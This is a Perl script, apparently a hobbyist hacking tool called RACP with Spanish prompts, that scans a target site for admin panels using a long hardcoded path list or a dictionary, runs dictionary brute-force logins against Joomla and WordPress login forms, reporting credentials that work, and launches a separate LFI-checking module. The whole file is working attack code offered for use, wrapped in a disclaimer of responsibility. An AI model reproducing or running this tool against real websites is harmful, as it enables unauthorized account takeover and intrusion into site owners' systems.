#Created by Rodrigo C. 
#Ultima actualizacion : 
# 25/09/2015
# 7:25 p.m
# 7:53 p.m
# Solucion fallo de directorio en kali linux :)
use LWP::Simple;
use feature qw(switch say);
use WWW::Mechanize;
print "\n\n\n";
system('cls');
print "
    Copyright (C) 2015  Rodrigo Canaza
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
    [!] Aviso Legal :
    Mi persona no se hace responsable de cualquier mal uso o daño causado por este programa.
    [!] Legal Disclaimer :
    My person is not responsible for any misuse or damage caused by this program.
Contact
|========================================|
||||||||||||||-----RACP-----||||||||||||||
|========================================|
[!]Si tienes alguna sugerencia o algun error contactame y reportamelo porfavor -> Gracias !
Facebook : https://www.fb.com/RodrigoAlonzoWar .
Autor : Rodrigo Canaza .
\n";
$file = 'mhe/dis.txt';
if ( -z $file  ){ 


	print "[!]Aceptas los terminos ? \n";
print "[!]Preciona Si[S] o No[N]...\n";
$respuesta = <STDIN>;
chomp($respuesta);
open (TER , ">$file") || die "[!] Algo fallo ...! \n";
print TER "$respuesta";
close(TER);
print "Porfavor vuelve a ejecutar RACP! \n";



	}
else {

open (TER , "<$file") || die "[!]Algo Fallo ...!\n";
while ($response = <TER>){
	if ($response =~ /S/ ||
		$response =~ /s/){
system('cls'); 

print "\n\n\n";
$msg =<<ETQT; 
               ####################################################
               #                                                  #
               #     *******       **       ******  *******       #
               #    /**////**     ****     **////**/**////**      #
               #    /**   /**    **//**   **    // /**   /**      # 
               #    /*******    **  //** /**       /*******       #
               #    /**///**   **********/**       /**////        #
               #    /**  //** /**//////**//**    **/**            #
               #    /**   //**/**     /** //****** /**            #
               #    //     // //      //   //////  //             #
               #                                                  #
               #   [*]Herramienta Hecha por :                     #
               #   ->Rodrigo Canaza . "RACP"                      #
               #   ->https://www.fb.com/RodrigoAlonzoWar          #
               #                                                  #
               #  Version : 0.5                                   #
               #                                                  #
               ####################################################
ETQT

print "$msg";
print "\n";
print "[1]Find admin page \n";
print "[2]Brute Force joomla. \n";
print "[3]Brute Force WordPress. \n";
print "[4]Verificar LFI\n\n";
print "===========================\n";
print "[!]Porfavor escoja una opcion : ";
$opc = <STDIN>;
chomp($opc);
given ($opc){
	when (1){ 
		print "     ";
		print "[a]Hallar panel por default...\n";
		print "     ";
		print "[b]Hallar panel por fuerza bruta...\n";
		print "     ";
		$fi = <STDIN>;
		chomp($fi);
		if ($fi eq 'a'){

print "\n";
print "Ejemplo...1 : http://www.target.com/ \n";
print "Ejemplo...2 : http://www.target.com/PATH \n";

print "\n\n[!]Ingrese la web a la cual desea pasar el script :\n\n\n";
$url = <STDIN>;
chomp($url);

if ($url !~ /^http:/){
	$url = 'http://' . $url;
}
if ($url !~ /\/$/){ 

	$url = $url . '/';
}
print "======================================\n\n";
print "[!]Comensando el scaneo a : $url\n";
print "[!]Starting ...!\n";
print "======================================\n\n\n";

print "[!] Happy Hacking ! :)\n";
print "[!] Porfavor revisa -> $url :2082 en la pagina ! \n";
print "[/] Ejemplo :  ";
print "http://www.target.com:2082  \n\n";

print "[!]Checking file :  ";
$testurl = $url .'robots.txt';
print "$testurl\n";
chomp($testurl);

$codigo = LWP::Simple::get($testurl);
if ( $codigo =~ /User-Agent/ ||
	 $codigo =~ /Disallow/ ){
	print "[+]Found -> $testurl\n";
}
else {
	print "[-]Not Found -> $testurl\n";
}
print "\n\n"; 
sleep(6);

@path1 = ('administrator/','admin/','controlpanel/','login/','panel/','cpanel/','admin.php/','account.html/','moderador/','cp.asp/','panel.php/','log/',
'adm/','admin/account.html','admin/login.html','admin/controlpanel.html','admin/controlpanel.htm','admin/adminlogin/','admin/admin-login.php',
'adminitem.php/','phpMyAdmin/','manager/','superuser/','sysadmin/','access/','admin/login.php','admin_area/','admin_area.php/','control/',
'control.php/','phpmyadmin/','PMA/','mysql/','phpamydmin2/','phpMyadmin2/','php-my-admin/','phpMyAdmin-2.2.3/','phpMyAdmin-2.2.6/','phpMyAdmin-2.5.1/',
'phpMyAdmin-2.5.4/','administrator/login.php','administrator/login.asp','admin_area/login.php','cp/','uvpanel/','management/','Management.asp/',
'seperman/','supervisor/','panel.php/','panel.asp/','member/','members/','members.php/','members.asp/','signin/','signin.php/','signin.asp/',
'wp-login.php/','bb-admin/login.php/','bb-admin/admin.php','bb-admin/login.asp','bb-admin/admin.html/','administrator/account.php',
'administrator/account.asp/','relogin.html/','relogin.html/','check.php/','check.asp/','blog/wp-login.php/','user/admin.php/','user/admin.asp/',
'users/admin.php','users/admin.asp','registration/','precesslogin.php/','processlogin.asp/','checklogin.php/','checklogin.asp','checkadmin.php',
'checkadmin.asp/','isadmin.php/','isadmin.asp/','authenticate.php/','authenticate.asp/','auth.php/','auth.asp/','authuser.php/',
'authuser.asp/','authadmin.php/','authadmin.asp/','cp.php','modelsearch/login.php','modelsearch.asp','moderator.php','moderator.asp/',
'moderator.php/','moderator/','fileadmin/','fileadmin.php/','fileadmin.asp/','admin1.php','admin1.asp','admin1.html','admin1.htm',
'admin2.php/','admin2.asp','admin2.html','yonetim.php/','yonetim.asp/','yonetim.htm/','yonetim.html/','yonetici.php/','yonetici.asp/',
'myadmin/','ur-admin.php/','ur-admin.asp/','ur-admin/','Server.php/','Server.asp/','server/','wp-admin/','administr8/','admins/',
'memlogin/','login_db/','xlogin/','superlogin/','customer_login/','bigamid/','project-admins/','SysAdmin2','global_admin/','phplqliteadmin/',
'navSiteadmin/','admincp/','acceso.php/','acceso.asp/','adminarea/','kpanel/','vorod/','vorod.php/','vorod.asp/','PSUser/','security/','usrc/','usr/',
'root/','secret/','1manager/','0manager/','login_out/','login_out.php/','login_out.asp/','supermanager/','seperusuario/','task/',
'surpervise/','supervise.php/','supervise.asp/','cgi-bin/login.php/','cgi-bin/login.asp','noticias/login.php/','cp.php/','administrator/index.php/',
'administrator/index.html/','yonetim.asp/','admin/account.asp/','cadmins/','server_admin_small/','logo_sysadmin/','power_user/',
'system_administration/','ss_vms_admin_sm/','panel-administracion/','instadmin/','administratorlogin/','admin_login/','panel-administracion/login/',
'pages/admin/','affiliate/','adm_auth/','memberadmin/','modules/admin/','administrators/','siteadmin/','vorod/','vorud/','secure/','webmaster/',
'cmsadmin/','admin/adminlogin/','0admin/','aadmin/','login1','login_admin/','login_user/','loginerror/','loginok/','loginsuper/','logut/',
'super_index/','superman/','fileadmin.php/','fileadmin.asp/','sysadmin.php/','administration.php/','ur-admin.asp/','ur-admin.php/','ur-admin.html',
'Server.php/','webadmin/','Amministrazione/','admin/login.php/admin/login.html','ss_vms_admin_sm/admin/account.html/admin/index.php/',
'ccms/','ccms/index.php','configure/','maintenance/','ss_vms_admin_sm/admin1.php','private/','priv/','private.html/','private.php/','priv8/',
'forum/forum.php','links/login.php/','SQLAdmin/','cmd/login/','@admin/','_adm/','_admin/','_admin_.php/'.'activate/','admin_.php/',
'adminka/','ann/','backup/','backups/','backupserver/','cfg.php/','cfg.txt/','cgi/','cgi-914/','cgi-915/','cgi-bin/','cgi-exe/','cgi-home/',
'cgi-home/','cgis/','chat/','cgi-sys/','cgi-win/','classes/','clients/','clients/','cobalt','config/','config.inc/','cook','db/',
'etc/','etc/security/','guest/','hack/','htbin/','library/','/cp-manage/','/blog/wp-login.php/','intranet.php/','PortalProveedores/','pma/');

foreach $test(@path1){

	$final_url = $url.$test;
	
	$codigo_pag = LWP::Simple::get($final_url);


	if ($codigo_pag =~ /admin/ || 
		$codigo_pag =~ /password/ ||
		$codigo_pag =~ /Contraseña/ ||
		$codigo_pag =~ /Personal/ ||
		$codigo_pag =~ /CLAVE/ ||
		$codigo_pag =~ /Pass/ ||
		$codigo_pag =~ /root/ ||
		$codigo_pag =~ /UserName/ ||
		$codigo_pag =~ /User/ ||
		$codigo_pag =~ /Clave/ ||
		$codigo_pag =~ /Token/ ||
		$codigo_pag =~ /Password/ ||
		$codigo_pag =~ /pass/ ||
		$codigo_pag =~ /Hotmail/ ||
		$codigo_pag =~ /Login/ ||
		$codigo_pag =~ /login/ ||
		$codigo_pag =~ /cPanel/ ||
		$codigo_pag =~ /unauthorized/ ||
		$codigo_pag =~ /login/){

		print "[+] Found -> ";
	}else {
		print "[-] Not Fund -> ";
	}
	print "$final_url\n"
}


		}
		
		elsif ($fi eq 'b'){ 
			print "\n";
print "Ejemplo...1 : http://www.target.com/ \n";
print "Ejemplo...2 : http://www.target.com/PATH \n";
            print "\n\n[!]Ingrese la web a la cual desea pasar el script :\n\n\n";

            $url = <STDIN>;
            chomp($url);

            if ($url !~ /^http:/){
	        $url = 'http://' . $url;
}
            if ($url !~ /\/$/){ 

	        $url = $url . '/';
}
            print "----------------------\n\n";
			print "Introdusca el directorio del diccionario\n";
			$diccfind = <STDIN>;
			chomp($diccfind);
			print "\n";
			print "======================================\n\n";
            print "[!]Comensando el scaneo a : $url\n";
            print "[!]Starting ...!\n";
            print "======================================\n\n\n";

print "[!] Happy Hacking ! :)\n";
print "[!] Porfavor revisa -> $url :2082 en la pagina ! \n";
print "[/] Ejemplo :  ";
print "http://www.target.com:2082  \n\n";

print "[!]Checking file :  ";
$testurl = $url .'robots.txt';

print "$testurl\n";
chomp($testurl);

$codigo = LWP::Simple::get($testurl);
if ( $codigo =~ /User-Agent/ ||
	 $codigo =~ /Disallow/ ){
	print "[+]Found -> $testurl\n";
}
else {
	print "[-]Not Found -> $testurl\n";
}

print "\n\n"; 
sleep(6);

			open (ADMINF , "<$diccfind");
			while (@adminpa = <ADMINF>){
				chomp(@adminpa);
					
				foreach $res(@adminpa){
					
					$final_url = $url.$res;
	               
	                $codigo_pag = LWP::Simple::get($final_url);

	                if ($codigo_pag =~ /admin/ || 
		$codigo_pag =~ /password/ ||
		$codigo_pag =~ /Contraseña/ ||
		$codigo_pag =~ /Personal/ ||
		$codigo_pag =~ /CLAVE/ ||
		$codigo_pag =~ /Pass/ ||
		$codigo_pag=~ /root/ ||
		$codigo_pag =~ /UserName/ ||
		$codigo_pag =~ /User/ ||
		$codigo_pag =~ /Clave/ ||
		$codigo_pag =~ /Token/ ||
		$codigo_pag =~ /Password/ ||
		$codigo_pag =~ /pass/ ||
		$codigo_pag =~ /Hotmail/ ||
		$codigo_pag =~ /Login/ ||
		$codigo_pag =~ /login/ ||
		$codigo_pag =~ /unauthorized/ ||
		$codigo_pag =~ /login/){

		print "[+] Found -> ";
	}else {
		print "[-] Not Fund -> ";
	}
	print "$final_url\n"
	
} 

}


close (ADMINF); 
		}
		else {
			print "[!]Introdusca una opcion valida...!"
			
		}
		}
	

	when (2) { 
print "\n\n";
print "Introduce la Url : \n";
$url = <STDIN>;
chomp($url);

if ($url !~ /^http:/){
	$url = 'http://' . $url;
}
if ($url !~ /\/$/){ 

	$url = $url . '/';
}
$joompe= WWW::Mechanize->new();
$joompe->get($url);
print "Introdusca el directorio de el diccionario del Nombre de Usuario ! : \n\n";
my $userlist = <STDIN>;
chomp($userlist);
print "==============================\n\n";
print "Introdusca el diccionario de las passwords ! : \n\n";
my $paslist = <STDIN>;
chomp($paslist);
print "\n\n";
print "======================================\n";
print "[!]Comensando el BRUTE FORCE a : \n";
print "[->] $url\n";
print "[!]Starting ...!\n";
print "======================================\n\n\n";
open (JOO , "<$userlist") || die "[!]Fallo ...! \n";
while ($admj = <JOO>){
	chomp($admj);
	open (ARCHIVO , "<$paslist") || die "[!]Fallo ...! \n";
	while ($pl = <ARCHIVO>){
		chomp($pl);



	$joompe->submit_form
       (
fields => { username => $admj , passwd => $pl , form_id => form-login  }

	 );

$pagco = $joompe -> content;
if ($pagco =~ /System/        ||
	$pagco =~ /Sistema/       ||
	$pagco =~ /Contenido/     ||
	$pagco =~ /Componentes/   ||
	$pagco =~ /Ayuda/         ||
	$pagco =~ /Help/          ||
	$pagco =~ /Extensiones/   ||
	$pagco =~ /Visitantes/ ){
	print "[+]Funciono   -> $admj : $pl\n ";
}
else {
	print "[-]Fallo   -> $admj : $pl\n";
}



}
	close(ARCHIVO);

	}
close(JOO);
}

		
	when (3) {
print "Introduce la Url\n";
$url = <STDIN>;
chomp($url);
if ($url !~ /^http:/){
	$url = 'http://' . $url;
}
if ($url !~ /\/$/){ 

	$url = $url . '/';
}

$wp= WWW::Mechanize->new();
$wp->get($url);
print "Introdusca el directorios de el diccionario del Username ! : \n";
my $Username = <STDIN>;
chomp($Username);
print "==============================\n\n";
print "Introdusca el diccionario del Password ! : \n";
my $password = <STDIN>;
chomp($password);
print "\n\n";
print "======================================\n";
print "[!]Comensando el BRUTE FORCE a : \n";
print "[->] $url\n";
print "[!]Starting ...!\n";
print "======================================\n\n\n";
open (ARCHIVO , "<$Username") || die "[!]Fallo ...! \n";
while ($adm = <ARCHIVO>){
	chomp($adm);
	open(PASSW , "<$password") || die "[!]Fallo ...! \n";
	while ($pss = <PASSW>){
		chomp($pss);

$wp->submit_form
       (

	fields => { log => $adm , pwd => $pss , form_id => loginform  }
		);
	
$tex_contend = $wp -> content;
if ($tex_contend =~ /Welcome/ ||
	$tex_contend =~ /Posts/   ||
	$tex_contend =~ /Pages/   ||
	$tex_contend =~ /New/     ||
	$tex_contend =~ /Nuevo/   ||
	$tex_contend =~ /Configuracion/  ){
	print "[+]Funciono -> $adm : $pss\n ";
	exit;

}
else {
	print "[-]Fallo  -> $adm : $pss\n ";
}

}
	close(PASSW);
	}
close(ARCHIVO);
	}	
when (4) {

 system('modu/lficheck.pl');


}
} 


}
else { 

	print "[!]Aceptas los terminos ? \n";
print "[!]Preciona Si[S] o No[N]...\n";
$respuesta = <STDIN>;
chomp($respuesta);
open (TER , ">$file") || die "[!] Algo fallo ...! \n";
print TER "$respuesta";
close(TER);
print "Porfavor vuelve a ejecutar RACP! \n";



}
} 

}

